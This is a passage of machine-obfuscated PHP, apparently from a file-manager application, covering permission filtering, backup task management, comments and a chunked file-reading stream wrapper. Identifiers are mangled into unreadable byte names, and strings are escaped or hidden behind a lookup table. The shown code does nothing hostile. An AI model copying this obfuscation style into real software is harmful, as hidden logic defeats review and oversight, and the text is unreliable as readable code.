$ŠçŸïÚÃ[1881] => 0); $‚µŞãíÑ = array_merge($Ü‰ƒµÌÕ, $‚µŞãíÑ); $‚µŞãíÑ[$ŠçŸïÚÃ[1881]] = $this->getSort(); $this->filterAuth($‚µŞãíÑ[$ŠçŸïÚÃ[413]]); return parent::insert($‚µŞãíÑ); } private function getSort() { $–¥ûİÉ¿ =& $_SERVER[Ì¥ŞÒ°£]; $®²âÆñÇ = parent::listData(); $µ©®ñªˆ = array_to_keyvalue($®²âÆñÇ, $–¥ûİÉ¿[12], $–¥ûİÉ¿[1881]); return empty($µ©®ñªˆ) ? 0 : max($µ©®ñªˆ) + 1; } private function filterAuth(&$•İ«ÌÔ) { if (!$•İ«ÌÔ) { return; } $ÜÙÖí€Š = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÜšÛïŸ‡ = array(); foreach ($ÜÙÖí€Š as $Ëé®¶®ä) { if ($•İ«ÌÔ & $Ëé®¶®ä) { $ÜšÛïŸ‡[] = $Ëé®¶®ä; } } if (in_array(self::AUTH_ROOT, $ÜšÛïŸ‡)) { $•İ«ÌÔ = array_sum($ÜÙÖí€Š); return; } $Ò…áÆøİ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÜšÛïŸ‡ as $Ëé®¶®ä) { if (isset($Ò…áÆøİ[$Ëé®¶®ä])) { $ÜšÛïŸ‡ = array_merge($ÜšÛïŸ‡, $Ò…áÆøİ[$Ëé®¶®ä]); } } $ÜšÛïŸ‡[] = self::AUTH_SHOW; $•İ«ÌÔ = array_sum(array_unique($ÜšÛïŸ‡)); } public function sort($œÑ„ø, $©ˆñ«æ’) { return parent::update($œÑ„ø, $©ˆñ«æ’); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\142\141\x63\153\165\x70\x4c\x69\x73\x74"; public $field = array("\151\x6f", "\156\x61\x6d\x65", "\x73\x74\x61\x74\x75\163", "\143\x6f\156\164\x65\x6e\x74", "\x6d\141\156\x75\141\x6c", "\162\x65\x73\x75\x6c\x74", "\164\x69\155\145\106\x72\157\x6d", "\164\x69\155\145\124\157"); public function config() { $ íÇÛó· =& $_SERVER[Ì¥ŞÒ°£]; $Úªäµê± = Model($ íÇÛó·[772])->get($ íÇÛó·[782]); $Úªäµê± = json_decode($Úªäµê±, !0); $Úªäµê± = is_array($Úªäµê±) ? $Úªäµê± : array(); if (!isset($Úªäµê±[$ íÇÛó·[757]])) { $Úªäµê±[$ íÇÛó·[757]] = $ íÇÛó·[88]; } unset($Úªäµê±[$ íÇÛó·[1637]]); Action($ íÇÛó·[1882])->taskInit(); Model($ íÇÛó·[1636])->cacheClear(); $óŞ²ñÃ = $ íÇÛó·[1883]; $îºœï¨â = Model($ íÇÛó·[1884])->findByKey($ íÇÛó·[1655], $óŞ²ñÃ); if (!$îºœï¨â) { $îºœï¨â = array(); } if (isset($îºœï¨â[$ íÇÛó·[203]])) { $îºœï¨â[$ íÇÛó·[203]] = json_decode($îºœï¨â[$ íÇÛó·[203]], !0); } if (isset($Úªäµê±[$ íÇÛó·[203]])) { $îºœï¨â[$ íÇÛó·[203]][$ íÇÛó·[1640]] = $Úªäµê±[$ íÇÛó·[203]]; unset($Úªäµê±[$ íÇÛó·[203]]); } return array_merge($îºœï¨â, $Úªäµê±); } public function listData($µŒıåÆú = false, $óæÔ«ºÚ = "\x6d\157\x64\x69\146\171\124\151\155\145", $·‹ãåç— = false) { return parent::listData($µŒıåÆú, $óæÔ«ºÚ, !0); } public function lastItem() { $º¹ó÷Şˆ = $this->listData(); return !empty($º¹ó÷Şˆ[0]) ? $º¹ó÷Şˆ[0] : null; } public function kill($º˜ëœ¼Ú) { $»ãâ”‰ë =& $_SERVER[Ì¥ŞÒ°£]; $İÕ¼÷éÆ = $this->listData($º˜ëœ¼Ú); if (!$İÕ¼÷éÆ || empty($İÕ¼÷éÆ[$»ãâ”‰ë[32]])) { return !0; } Task::kill($»ãâ”‰ë[781]); Task::kill($»ãâ”‰ë[802]); Task::kill($»ãâ”‰ë[811]); $ó»©ğ”× = $İÕ¼÷éÆ[$»ãâ”‰ë[32]]; $¤—¾Ù³ = TEMP_FILES . $»ãâ”‰ë[780] . $ó»©ğ”× . $»ãâ”‰ë[8]; IO::remove($¤—¾Ù³, !1); return $this->remove($º˜ëœ¼Ú); } public function remove($øÊ¬³ò) { $ä³Ä¼ú = $this->listData($øÊ¬³ò); if (!$ä³Ä¼ú) { return !0; } return $this->backupRemove($ä³Ä¼ú); } private function backupRemove($¨é‡åÙÁ) { parent::remove($¨é‡åÙÁ[$_SERVER[Ì¥ŞÒ°£][399]]); $„şÀÃ Ò = $this->backupPath($¨é‡åÙÁ); IO::remove($„şÀÃ Ò, !1); return !0; } private function backupPath($ÙÎØğºœ) { $ëÕ»¹¬¶ =& $_SERVER[Ì¥ŞÒ°£]; $°š¢äÈá = $ÙÎØğºœ[$ëÕ»¹¬¶[32]]; $¾åÊÈ¶ = Model($ëÕ»¹¬¶[772])->get($ëÕ»¹¬¶[773]); $€ÔíÍïè = substr(md5($ëÕ»¹¬¶[774] . $¾åÊÈ¶ . $°š¢äÈá), 0, 8); return "\x7b\151\x6f\72{$ÙÎØğºœ[$ëÕ»¹¬¶[754]]}\x7d\x2f\x64\x61\164\x61\142\141\163\145\57\x62\141\143\153\165\160\57" . $°š¢äÈá . $ëÕ»¹¬¶[11] . $€ÔíÍïè; } public function start() { $“Ù¯Ï¯¥ =& $_SERVER[Ì¥ŞÒ°£]; if ($GLOBALS[$“Ù¯Ï¯¥[6]][$“Ù¯Ï¯¥[89]][$“Ù¯Ï¯¥[1885]] != $“Ù¯Ï¯¥[88]) { return !0; } $Ïö¡³¡½ = $this->config(); if (!$Ïö¡³¡½ || $Ïö¡³¡½[$“Ù¯Ï¯¥[1637]] != $“Ù¯Ï¯¥[88]) { return !1; } $ÅŠöÚƒ‚ = $this->process(); foreach ($ÅŠöÚƒ‚ as $¢àÌãÙ) { if ($¢àÌãÙ) { return Task::restart($¢àÌãÙ[$“Ù¯Ï¯¥[399]]); } } $´ùğôÅ = new Backup(); $÷ÅğÁÃğ = $´ùğôÅ->db(); if ($÷ÅğÁÃğ) { $÷ÅğÁÃğ = $´ùğôÅ->dbFile(); if ($÷ÅğÁÃğ && $Ïö¡³¡½[$“Ù¯Ï¯¥[757]] == $“Ù¯Ï¯¥[197]) { $÷ÅğÁÃğ = $´ùğôÅ->file(); } } Backup::set(array($“Ù¯Ï¯¥[752] => 1, $“Ù¯Ï¯¥[497] => time())); return !0; } public function process() { $Ç€±í½Ğ =& $_SERVER[Ì¥ŞÒ°£]; $›¼ò“Ç = array($Ç€±í½Ğ[760] => Task::get($Ç€±í½Ğ[781]), $Ç€±í½Ğ[764] => Task::get($Ç€±í½Ğ[802]), $Ç€±í½Ğ[199] => Task::get($Ç€±í½Ğ[811])); $ŞŸÇ”üº = !1; foreach ($›¼ò“Ç as &$•÷µÜÎ) { if ($ŞŸÇ”üº) { $•÷µÜÎ = !1; continue; } if ($•÷µÜÎ) { $‡•«—ü = intval(_get($•÷µÜÎ, $Ç€±í½Ğ[1672], 0)); if (time() - $‡•«—ü > 7200) { Task::kill($•÷µÜÎ[$Ç€±í½Ğ[399]]); $ŞŸÇ”üº = !0; $•÷µÜÎ = !1; } } } return $›¼ò“Ç; } public function restore() { $‚¤ıâÁ© =& $_SERVER[Ì¥ŞÒ°£]; ActionCall($‚¤ıâÁ©[1065], !0, 1); ActionCall($‚¤ıâÁ©[1065], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\x6e\164"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\x6d\145" => "\x63\x6f\155\x6d\145\156\x74\137\155\x65\x74\141", "\155\x65\164\141\x46\151\x65\x6c\144" => "\x63\157\155\155\x65\156\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Î³ ñœğ) { $ÆÆéŒ¥» =& $_SERVER[Ì¥ŞÒ°£]; if ($Î³ ñœğ[$ÆÆéŒ¥»[1886]]) { $Ïº’’ÑÑ = $this->where(array($ÆÆéŒ¥»[1887] => $Î³ ñœğ[$ÆÆéŒ¥»[1886]]))->find(); if (!$Ïº’’ÑÑ || $Ïº’’ÑÑ[$ÆÆéŒ¥»[411]] != $Î³ ñœğ[$ÆÆéŒ¥»[411]] || $Ïº’’ÑÑ[$ÆÆéŒ¥»[505]] != $Î³ ñœğ[$ÆÆéŒ¥»[505]]) { return !1; } $this->where(array($ÆÆéŒ¥»[1887] => $Î³ ñœğ[$ÆÆéŒ¥»[1886]]))->setAdd($ÆÆéŒ¥»[1888], 1); } $Î³ ñœğ[$ÆÆéŒ¥»[1889]] = 0; $Î³ ñœğ[$ÆÆéŒ¥»[1888]] = 0; $Î³ ñœğ[$ÆÆéŒ¥»[752]] = 1; return $this->add($Î³ ñœğ); } public function commentCount($ÉÂ’é©Å, $¡—ç² ¾, $‰‹ä‰ÔŸ = false) { $´¸Ì”øÕ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ÉÂ’é©Å) { return array(); } if (is_string($ÉÂ’é©Å) || is_int($ÉÂ’é©Å)) { $ÉÂ’é©Å = array($ÉÂ’é©Å); } $ûõ —÷ = array($´¸Ì”øÕ[505], $´¸Ì”øÕ[1890] => $´¸Ì”øÕ[500]); $ıÑúÄ¨ = array($´¸Ì”øÕ[505] => array($´¸Ì”øÕ[7], $ÉÂ’é©Å), $´¸Ì”øÕ[411] => $¡—ç² ¾); if ($‰‹ä‰ÔŸ) { $ıÑúÄ¨[$´¸Ì”øÕ[1667]] = $‰‹ä‰ÔŸ; } $ò¦ãÀáõ = $this->field($ûõ —÷)->where($ıÑúÄ¨)->group($´¸Ì”øÕ[505])->select(); return array_to_keyvalue($ò¦ãÀáõ, $´¸Ì”øÕ[505], $´¸Ì”øÕ[500]); } public function starTarget($¯ûÖƒüñ, $­õ´¸Ê) { $êšº¢ëş =& $_SERVER[Ì¥ŞÒ°£]; $öÊ¦‘¡Ş = $¯ûÖƒüñ + self::TYPE_STAR_OFFSET; $’¬˜¹ŸÆ = array($êšº¢ëş[1667] => USER_ID, $êšº¢ëş[411] => $öÊ¦‘¡Ş, $êšº¢ëş[505] => $­õ´¸Ê); $çä‘ü€µ = $this->where($’¬˜¹ŸÆ)->find(); if ($çä‘ü€µ) { return $this->where(array($êšº¢ëş[399] => $çä‘ü€µ[$êšº¢ëş[399]]))->delete(); } $Ëğï¶Û° = array($êšº¢ëş[1886] => 0, $êšº¢ëş[1667] => USER_ID, $êšº¢ëş[752] => 1, $êšº¢ëş[757] => $êšº¢ëş[12], $êšº¢ëş[411] => $öÊ¦‘¡Ş, $êšº¢ëş[505] => $­õ´¸Ê, $êšº¢ëş[1889] => 0, $êšº¢ëş[1888] => 0); return $this->add($Ëğï¶Û°); } public function starTargetCount($Ê±£Úèü, $‡ˆŞ‡ÔÖ) { $Ñ´’«á =& $_SERVER[Ì¥ŞÒ°£]; $„Äõû­– = $‡ˆŞ‡ÔÖ + self::TYPE_STAR_OFFSET; $üÙÕ š± = $this->commentCount($Ê±£Úèü, $„Äõû­–); $ñÀçôÁÃ = $this->commentCount($Ê±£Úèü, $„Äõû­–, USER_ID); return array($Ñ´’«á[1891] => $üÙÕ š±, $Ñ´’«á[1892] => $ñÀçôÁÃ); } public function starTargetUserList($™èßöÛ¾, $’÷ÚÈêœ) { $…½Î›÷ =& $_SERVER[Ì¥ŞÒ°£]; $Á¡¯¹ = $™èßöÛ¾ + self::TYPE_STAR_OFFSET; $‡¢¢á = array($…½Î›÷[505] => $’÷ÚÈêœ, $…½Î›÷[411] => $Á¡¯¹); $ßÏ‚ääš = $this->where($‡¢¢á)->count(); $³²Ïß’ = array($…½Î›÷[255] => $ßÏ‚ääš, $…½Î›÷[1893] => array()); if (!$ßÏ‚ääš) { return $³²Ïß’; } $ƒ²›‹¤ğ = $this->field($…½Î›÷[1667])->where($‡¢¢á)->limit(500)->select(); $ƒ²›‹¤ğ = array_to_keyvalue($ƒ²›‹¤ğ, $…½Î›÷[12], $…½Î›÷[1667]); $³²Ïß’[$…½Î›÷[1893]] = Model($…½Î›÷[513])->userListInfo($ƒ²›‹¤ğ); return $³²Ïß’; } public function prasiseUserList($‡—û™«) { $–Ô­ªÜè =& $_SERVER[Ì¥ŞÒ°£]; $Ú”¦™¨µ = array($–Ô­ªÜè[1894] => $‡—û™«); $»ş­ı¯ó = $this->where($Ú”¦™¨µ)->find(); $©™»Ã‹Î = _get($»ş­ı¯ó, $–Ô­ªÜè[1889], 0); $÷Ö§æ‹£ = array($–Ô­ªÜè[255] => $©™»Ã‹Î, $–Ô­ªÜè[1893] => array()); if (!$©™»Ã‹Î) { return $÷Ö§æ‹£; } $Ä„‚ãïå = Model($–Ô­ªÜè[1895])->field($–Ô­ªÜè[1667])->where($Ú”¦™¨µ)->limit(500)->select(); $Ä„‚ãïå = array_to_keyvalue($Ä„‚ãïå, $–Ô­ªÜè[12], $–Ô­ªÜè[1667]); $÷Ö§æ‹£[$–Ô­ªÜè[1893]] = Model($–Ô­ªÜè[513])->userListInfo($Ä„‚ãïå); return $÷Ö§æ‹£; } public function remove($£Ê¦Êƒ¦) { $¼İ˜ü‚ä =& $_SERVER[Ì¥ŞÒ°£]; $ÃÒ·Ş±š = array($¼İ˜ü‚ä[1887] => $£Ê¦Êƒ¦); $í€Äıî™ = $this->where($ÃÒ·Ş±š)->find(); if ($í€Äıî™[$¼İ˜ü‚ä[1886]]) { $this->where(array($¼İ˜ü‚ä[1887] => $í€Äıî™[$¼İ˜ü‚ä[1886]]))->setAdd($¼İ˜ü‚ä[1888], -1); } return $this->where($ÃÒ·Ş±š)->delete(); } public function edit($ı¶©ÊŸ„, $ ·òİ¢¤) { $âğß™ñ =& $_SERVER[Ì¥ŞÒ°£]; $Ÿë´ïÍ = array($âğß™ñ[1887] => $ı¶©ÊŸ„); return $this->where($Ÿë´ïÍ)->save(array($âğß™ñ[1896] => $ ·òİ¢¤)); } public function prasise($É®ú‚œ) { $ø±ïô¬ =& $_SERVER[Ì¥ŞÒ°£]; $ù˜Ş³ÏØ = Model($ø±ïô¬[1897]); $ÛçÏ†Ì³ = array($ø±ïô¬[1887] => $É®ú‚œ, $ø±ïô¬[1658] => USER_ID); $ˆêõ§ÃÅ = $ù˜Ş³ÏØ->where($ÛçÏ†Ì³)->find(); if (!$ˆêõ§ÃÅ) { $ù˜Ş³ÏØ->add($ÛçÏ†Ì³); $¯„™»º½ = $this->where(array($ø±ïô¬[1887] => $É®ú‚œ))->setAdd($ø±ïô¬[1889], 1); } else { $ù˜Ş³ÏØ->where($ÛçÏ†Ì³)->delete(); $¯„™»º½ = $this->where(array($ø±ïô¬[1887] => $É®ú‚œ))->setAdd($ø±ïô¬[1889], -1); } return $¯„™»º½; } public function targetInfo($óÁÈÈ«Ò, $ıÎ×»”») { $â¾•›Çª =& $_SERVER[Ì¥ŞÒ°£]; $îçù±ì¬ = array($â¾•›Çª[586] => $óÁÈÈ«Ò, $â¾•›Çª[587] => $ıÎ×»”»); $œ¢ŒË…¾ = $this->where($îçù±ì¬)->count(); $ÂÕ›ú”„ = "\122\x49\107\110\124\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\143\x6f\x6d\x6d\x65\x6e\164\137\x70\162\x61\151\163\145\40\x73\x74\x61\162\40\157\x6e\x20\x63\157\x6d\155\145\x6e\164\x2e\143\x6f\x6d\x6d\145\156\164\111\104\x20\x3d\x20\x73\x74\141\x72\x2e\x63\157\x6d\155\x65\x6e\164\111\x44"; $ÛİÄø = $this->alias($â¾•›Çª[354])->where($îçù±ì¬)->join($ÂÕ›ú”„, $â¾•›Çª[1898])->count(); $Ïôì¸ëŠ = array($â¾•›Çª[1899] => $œ¢ŒË…¾, $â¾•›Çª[1900] => $ÛİÄø); return $Ïôì¸ëŠ; } public function listData($âØıÁºâ) { $øšÎŒ…  =& $_SERVER[Ì¥ŞÒ°£]; if (isset($âØıÁºâ[$øšÎŒ… [1901]])) { if ($âØıÁºâ[$øšÎŒ… [1901]]) { $âØıÁºâ[$øšÎŒ… [1894]] = array($øšÎŒ… [1019], intval($âØıÁºâ[$øšÎŒ… [1901]])); } unset($âØıÁºâ[$øšÎŒ… [1901]]); } if (isset($âØıÁºâ[$øšÎŒ… [1902]])) { if ($âØıÁºâ[$øšÎŒ… [1902]]) { $âØıÁºâ[$øšÎŒ… [1894]] = array($øšÎŒ… [1016], intval($âØıÁºâ[$øšÎŒ… [1902]])); } unset($âØıÁºâ[$øšÎŒ… [1902]]); } return $this->_listData($âØıÁºâ); } private function _listData($¿òêÉíâ) { $‘¡ùØÊù =& $_SERVER[Ì¥ŞÒ°£]; $‘ûæ¿áÑ = $this->where($¿òêÉíâ)->_makeOrder()->selectPage(100); $this->_listAppendParent($‘ûæ¿áÑ[$‘¡ùØÊù[369]]); $this->_listAppendUser($‘ûæ¿áÑ[$‘¡ùØÊù[369]]); $this->_listAppendMeta($‘ûæ¿áÑ[$‘¡ùØÊù[369]]); return $‘ûæ¿áÑ; } private function _makeOrder() { $üéä¢áŞ =& $_SERVER[Ì¥ŞÒ°£]; $Õ»ù¡Çâ = array($üéä¢áŞ[1889], $üéä¢áŞ[1888], $üéä¢áŞ[200]); $ê­¥é¤Ø = Input::get($üéä¢áŞ[457], $üéä¢áŞ[7], $üéä¢áŞ[423], $Õ»ù¡Çâ); $ò“Ô·¬œ = Input::get($üéä¢áŞ[458], $üéä¢áŞ[7], $üéä¢áŞ[1660], array($üéä¢áŞ[1903], $üéä¢áŞ[453])); $ŞĞåúäÚ = $ê­¥é¤Ø . $üéä¢áŞ[53] . $ò“Ô·¬œ; return $this->order($ŞĞåúäÚ); } private function _listAppendParent(&$…‡°œ•†) { $‰³ –Å =& $_SERVER[Ì¥ŞÒ°£]; $µüÖ‰‹ = array_unique(array_to_keyvalue($…‡°œ•†, $‰³ –Å[12], $‰³ –Å[1886])); $µüÖ‰‹ = array_remove_value($µüÖ‰‹, $‰³ –Å[197]); if (!$µüÖ‰‹) { return; } $±—ş´”¾ = $this->where(array($‰³ –Å[1887] => array($‰³ –Å[7], $µüÖ‰‹)))->select(); $±—ş´”¾ = array_to_keyvalue($±—ş´”¾, $‰³ –Å[1894]); foreach ($…‡°œ•† as &$¾š¢ùâ) { if (isset($±—ş´”¾[$¾š¢ùâ[$‰³ –Å[1886]]])) { $¾š¢ùâ[$‰³ –Å[1904]] = $±—ş´”¾[$¾š¢ùâ[$‰³ –Å[1886]]]; } } unset($¾š¢ùâ); } private function _listAppendUser(&$ËîÕ®¾ñ) { $æÀ´Å‡İ =& $_SERVER[Ì¥ŞÒ°£]; $ùÁ»¾‚ = array_unique(array_to_keyvalue($ËîÕ®¾ñ, $æÀ´Å‡İ[12], $æÀ´Å‡İ[1667])); $ùÁ»¾‚ = array_remove_value($ùÁ»¾‚, $æÀ´Å‡İ[197]); if (count($ùÁ»¾‚) == 0) { return; } foreach ($ËîÕ®¾ñ as $¸Ø‘íû›) { if (isset($¸Ø‘íû›[$æÀ´Å‡İ[1904]])) { $ùÁ»¾‚[] = $¸Ø‘íû›[$æÀ´Å‡İ[1904]][$æÀ´Å‡İ[1667]]; } } $î»îÄ¢¬ = Model($æÀ´Å‡İ[535])->userListInfo($ùÁ»¾‚); foreach ($ËîÕ®¾ñ as &$¸Ø‘íû›) { $¸Ø‘íû›[$æÀ´Å‡İ[600]] = $î»îÄ¢¬[$¸Ø‘íû›[$æÀ´Å‡İ[1667]]]; if (isset($¸Ø‘íû›[$æÀ´Å‡İ[1904]])) { $¸Ø‘íû›[$æÀ´Å‡İ[1904]][$æÀ´Å‡İ[600]] = $î»îÄ¢¬[$¸Ø‘íû›[$æÀ´Å‡İ[1904]][$æÀ´Å‡İ[1667]]]; } } unset($¸Ø‘íû›); } private function _listAppendMeta(&$€¢Ú¹¿Í) { $ı˜†Èö =& $_SERVER[Ì¥ŞÒ°£]; $Â—´ë¾Ş = array_unique(array_to_keyvalue($€¢Ú¹¿Í, $ı˜†Èö[12], $ı˜†Èö[1894])); $Â—´ë¾Ş = array_remove_value($Â—´ë¾Ş, $ı˜†Èö[197]); if (!$Â—´ë¾Ş) { return; } foreach ($€¢Ú¹¿Í as $âÆ“µ”ã) { if (isset($âÆ“µ”ã[$ı˜†Èö[1904]])) { $Â—´ë¾Ş[] = $âÆ“µ”ã[$ı˜†Èö[1904]][$ı˜†Èö[1894]]; } } $ß…–ÂÜ™ = $this->metaList($Â—´ë¾Ş); if (!$ß…–ÂÜ™) { return !1; } foreach ($€¢Ú¹¿Í as &$âÆ“µ”ã) { $âÆ“µ”ã[$ı˜†Èö[466]] = $ß…–ÂÜ™[$âÆ“µ”ã[$ı˜†Èö[1894]]]; if (isset($âÆ“µ”ã[$ı˜†Èö[1904]])) { $âÆ“µ”ã[$ı˜†Èö[1904]][$ı˜†Èö[466]] = $ß…–ÂÜ™[$âÆ“µ”ã[$ı˜†Èö[1904]][$ı˜†Èö[1894]]]; } } unset($âÆ“µ”ã); } private function metaList($¯ˆÍú«™) { $àö«¶û¢ =& $_SERVER[Ì¥ŞÒ°£]; if (!$¯ˆÍú«™) { return array(); } $É—Ñ¿üò = array($àö«¶û¢[1894] => array($àö«¶û¢[7], $¯ˆÍú«™)); $€åœÄâ = Model($àö«¶û¢[1905])->where($É—Ñ¿üò)->select(); $€åœÄâ = array_to_keyvalue_group($€åœÄâ, $àö«¶û¢[1894]); foreach ($€åœÄâ as $ÒáÎ”®Ù => $ç³Ù“«Š) { $ Æ” Í³ = array(); foreach ($ç³Ù“«Š as $Ôå òö÷) { $ Æ” Í³[$Ôå òö÷[$àö«¶û¢[94]]] = $Ôå òö÷[$àö«¶û¢[374]]; } $€åœÄâ[$ÒáÎ”®Ù] = $ Æ” Í³; } return $€åœÄâ ? $€åœÄâ : array(); } } goto dõ¢Ô¬¨„ğ; f‰ñœ˜òù»: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ŸÔÓŠÓ, $¦…¦½‹… = '') { $this->info = $this->info($ŸÔÓŠÓ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ì¥ŞÒ°£][84]]; $this->pathOpen = $ŸÔÓŠÓ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ŸÔÓŠÓ])) { self::$_chunkBuffer[$ŸÔÓŠÓ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Š·ğÅÑö) { $æ£â¥¨• = $this->fileSubstr($this->pose, $Š·ğÅÑö); $this->pose += strlen($æ£â¥¨•); return $æ£â¥¨•; } public function stream_tell() { return $this->pose; } public function stream_seek($ŠñÛ¯˜, $å­ÆÇ’¸) { $ñÄà¼¥Á =& $_SERVER[Ì¥ŞÒ°£]; if ($å­ÆÇ’¸ == SEEK_SET) { $this->pose = $ŠñÛ¯˜; } else { if ($å­ÆÇ’¸ == SEEK_CUR) { $this->pose += $ŠñÛ¯˜; } else { if ($å­ÆÇ’¸ == SEEK_END) { $this->pose = $this->info[$ñÄà¼¥Á[76]] + intval($ŠñÛ¯˜); } } } if ($ŠñÛ¯˜ < 0) { $this->pose = $this->info[$ñÄà¼¥Á[76]] + $ŠñÛ¯˜; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ì¥ŞÒ°£][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($•áÁÉÉ, $É³‡‘—¶) { $ÇÆÈßÚø =& $_SERVER[Ì¥ŞÒ°£]; $‰Ì¢à§ô = $this->info($•áÁÉÉ); return array($ÇÆÈßÚø[1517] => 0, $ÇÆÈßÚø[1518] => 0, $ÇÆÈßÚø[16] => 32768 + 511, $ÇÆÈßÚø[1519] => 0, $ÇÆÈßÚø[1520] => 0, $ÇÆÈßÚø[1521] => 0, $ÇÆÈßÚø[1522] => 0, $ÇÆÈßÚø[76] => $‰Ì¢à§ô[$ÇÆÈßÚø[76]], $ÇÆÈßÚø[1523] => $‰Ì¢à§ô[$ÇÆÈßÚø[1391]], $ÇÆÈßÚø[1479] => $‰Ì¢à§ô[$ÇÆÈßÚø[85]], $ÇÆÈßÚø[1478] => $‰Ì¢à§ô[$ÇÆÈßÚø[200]], $ÇÆÈßÚø[1524] => 0, $ÇÆÈßÚø[1525] => 0); } static $fileInfo = array(); public function info($œ¨Ä†ß¶) { $ö±“¹µ› = $_SERVER[Ì¥ŞÒ°£][1526]; if (isset(self::$fileInfo[$œ¨Ä†ß¶])) { return self::$fileInfo[$œ¨Ä†ß¶]; } if (substr($œ¨Ä†ß¶, 0, strlen($ö±“¹µ›)) != $ö±“¹µ›) { return !1; } self::$fileInfo[$œ¨Ä†ß¶] = IO::info(substr($œ¨Ä†ß¶, strlen($ö±“¹µ›))); return self::$fileInfo[$œ¨Ä†ß¶]; } public static function read($çûĞ¨úş, $Ú›ëŠ‚ï, $…ÇË¬Óô) { if (!isset(self::$_fopenCache[$çûĞ¨úş])) { $ú İÇ‚Ÿ = new StreamWrapperIO(); $ú İÇ‚Ÿ->stream_open($çûĞ¨úş); self::$_fopenCache[$çûĞ¨úş] = $ú İÇ‚Ÿ; } $ú İÇ‚Ÿ = self::$_fopenCache[$çûĞ¨úş]; return $ú İÇ‚Ÿ->fileSubstr($Ú›ëŠ‚ï, $…ÇË¬Óô); } public static function _read($ƒôòÑ¬ô, $‚Ö–©è, $Ö©–¿¿) { $ß‚Œ„şë =& $_SERVER[Ì¥ŞÒ°£]; $ã¿­–óá = fopen($ƒôòÑ¬ô, $ß‚Œ„şë[1395]); if (!$ã¿­–óá) { return $ß‚Œ„şë[12]; } $œ¶¥ğÍô = 8192; fseek($ã¿­–óá, $‚Ö–©è, SEEK_SET); $ÂŒÇÖ…Ù = $ß‚Œ„şë[12]; $ì½ù…ÈÊ = 0; while ($ì½ù…ÈÊ < $Ö©–¿¿) { $ş»è¸ = min($œ¶¥ğÍô, $Ö©–¿¿ - $ì½ù…ÈÊ); $ÂŒÇÖ…Ù .= fread($ã¿­–óá, $ş»è¸); $ì½ù…ÈÊ += $ş»è¸; } fclose($ã¿­–óá); return $ÂŒÇÖ…Ù; } public function fileSubstr($İÜ»ÌÇó, $É§ìÌ–á) { $ñıïÇ¯› =& $_SERVER[Ì¥ŞÒ°£]; $‚ÊüŸˆÖ = $this->info[$ñıïÇ¯›[76]]; $åÚ‘ƒŞ = $İÜ»ÌÇó; $ Ïö‚± = $É§ìÌ–á; if ($İÜ»ÌÇó < 0) { $İÜ»ÌÇó = $‚ÊüŸˆÖ + $İÜ»ÌÇó; } if ($É§ìÌ–á === !1) { $É§ìÌ–á = $‚ÊüŸˆÖ - $İÜ»ÌÇó; } if ($İÜ»ÌÇó + $É§ìÌ–á > $‚ÊüŸˆÖ) { $É§ìÌ–á = $‚ÊüŸˆÖ - $İÜ»ÌÇó; } if ($É§ìÌ–á <= 0) { return $ñıïÇ¯›[12]; } if ($İÜ»ÌÇó < 0 || $İÜ»ÌÇó >= $‚ÊüŸˆÖ || $É§ìÌ–á <= 0 || $É§ìÌ–á > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\145\x52\x65\x61\144\x20\x65\x72\x72\x6f\162\x21\40\163\164\141\x72\x74\75{$İÜ»ÌÇó}\73\x6c\145\x6e\x67\164\150\75{$É§ìÌ–á}\73\x20\x73\x69\172\145\x3d{$‚ÊüŸˆÖ}\73"); } $ò½Õëª¿ = 64 * 1024; $¤¹¢„Ü =& self::$_chunkBuffer[$this->path]; if (!$¤¹¢„Ü) { $¤¹¢„Ü = array(); } $¥ú’±Ó¢ = 0; $İìØõª = 0; $ºâÄİî´ = $ñıïÇ¯›[12]; foreach ($¤¹¢„Ü as $¥ú’±Ó¢ => $ºâÄİî´) { $¥ú’±Ó¢ = intval($¥ú’±Ó¢); $İìØõª = $¥ú’±Ó¢ + strlen($ºâÄİî´); if ($İÜ»ÌÇó >= $İìØõª) { continue; } if ($İÜ»ÌÇó >= $¥ú’±Ó¢ && $İÜ»ÌÇó + $É§ìÌ–á <= $İìØõª) { return substr($ºâÄİî´, $İÜ»ÌÇó - $¥ú’±Ó¢, $É§ìÌ–á); } break; } if (count($¤¹¢„Ü) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ñıïÇ¯›[1527], $ñıïÇ¯›[1528] . count($¤¹¢„Ü) . "\73\163\x74\x61\x72\x74\x3d{$İÜ»ÌÇó}\x2c\x6c\145\156\147\164\150\x3d{$É§ìÌ–á}\73\x70\x6f\x73\x65\72{$¥ú’±Ó¢}\x7e{$İìØõª}"); throw new Exception($ñıïÇ¯›[1529]); } $ ¥á‰Ëı = intval($İÜ»ÌÇó / $ò½Õëª¿) * $ò½Õëª¿; 